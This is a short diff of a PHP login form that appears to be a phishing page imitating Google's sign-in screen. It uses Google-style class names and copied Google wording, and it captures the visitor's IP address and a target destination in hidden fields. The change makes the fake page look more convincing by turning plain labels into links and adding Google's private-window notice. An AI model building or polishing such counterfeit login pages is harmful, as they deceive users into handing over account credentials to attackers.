@@ -90,10 +90,13 @@ require_once('helper.php');
                             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                             <input type="hidden" name="target" value="<?=$destination?>">
 
-                            <legend class='g-legend'>Forgot email?</legend>
+                            <a href="#" class="forgot-email">Forgot email?</a>
+                            <div class='login-priv'>
+                                <p class='p'>Not your computer? Use a Private Window to sign in. <a href="#">Learn more about using Guest mode</a></p>
+                            </div>
                             <!-- form navigation menu -->
                             <div class='login-nav'>
-                                <legend class='g-legend'>Create Account</legend>
+                                <a href="#" class="create-account">Create Account</a>
                                 <!-- <div class='gbtn-primary btn-next-email'><span class='gbtn-label'>Next</span></div> -->
                                 <button class='gbtn-primary' type="submit">Next</button>
                             </div>
